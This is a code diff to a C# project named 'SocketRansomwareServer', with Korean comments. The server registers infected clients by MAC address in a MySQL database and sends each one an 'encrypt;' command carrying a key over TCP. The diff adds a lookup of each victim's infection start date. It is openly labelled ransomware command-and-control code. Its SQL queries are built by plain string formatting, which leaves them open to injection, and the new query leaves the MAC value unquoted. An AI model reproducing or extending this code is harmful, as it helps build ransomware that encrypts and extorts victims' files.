@@ -62,6 +62,7 @@ namespace SocketRansomwareServer
             private delegate void SafeCallDelegate(string text);
             TcpClient tcp; //해당쓰레드에서 담당할 클라이언트 객체
             ListView listView; //리스트박스를 다른클래스에서 조정하기위해 만든 listBox
+            string _mac = null;
             public void Set(TcpClient tcp, ListView listView)
             {
                 this.tcp = tcp;
@@ -95,6 +96,7 @@ namespace SocketRansomwareServer
             //접속한 클라이언트가 최초 실행인지 확인
             private void CheckDB(string mac)
             {
+                _mac = mac;
                 try
                 {
                     using (DB.Instance._connection)
@@ -102,10 +104,11 @@ namespace SocketRansomwareServer
                         string query = string.Format("select * from client where mac = '{0}'", mac);
                         MySqlCommand command = new MySqlCommand(query, DB.Instance._connection);
                         MySqlDataReader table = command.ExecuteReader();
-
+                        
                         if(table.HasRows)
                         {
-                            Console.WriteLine("이미 존재");
+                            Console.WriteLine($"이미 존재, {table["start_date"]}");
+
                             table.Close();
                             
                         } else
@@ -128,7 +131,7 @@ namespace SocketRansomwareServer
                             if (command.ExecuteNonQuery() == 1)
                             {
                                 Console.WriteLine("DB 저장 성공");
-                                SendKeyClient("encrypt;" + key);
+                                SendDataClient("encrypt;" + key);
 
                             }
                             else Console.WriteLine("DB 저장 실패");
@@ -141,15 +144,32 @@ namespace SocketRansomwareServer
                 }
             }
 
-            //클라이언트로 키 전송
-            public void SendKeyClient(string key)
+            private void GetInfectionTime()
+            {
+                using (DB.Instance._connection)
+                {
+                    string query = $"select start_date from client where mac = {_mac}";
+                    MySqlCommand command = new MySqlCommand(query, DB.Instance._connection);
+                    MySqlDataReader table = command.ExecuteReader();
+
+                    while(table.Read())
+                    {
+                        Console.WriteLine($"{table["start_date"]}");
+                    }
+                    
+                }
+
+            }
+
+            //클라이언트로 데이터 전송
+            private void SendDataClient(string str)
             {
                 try
                 {
                     byte[] buffer = new byte[1024];
                     NetworkStream net;
                     for (int i = 0; i < 1024; i++) buffer[i] = 0; //c++로따지면 ZeroMemory(bytes,1024);
-                    buffer = Encoding.Default.GetBytes(key);
+                    buffer = Encoding.Default.GetBytes(str);
                     net = tcp.GetStream(); //네트워크스트림 얻어오기
                     net.Write(buffer, 0, buffer.Length);
                     net.Flush();
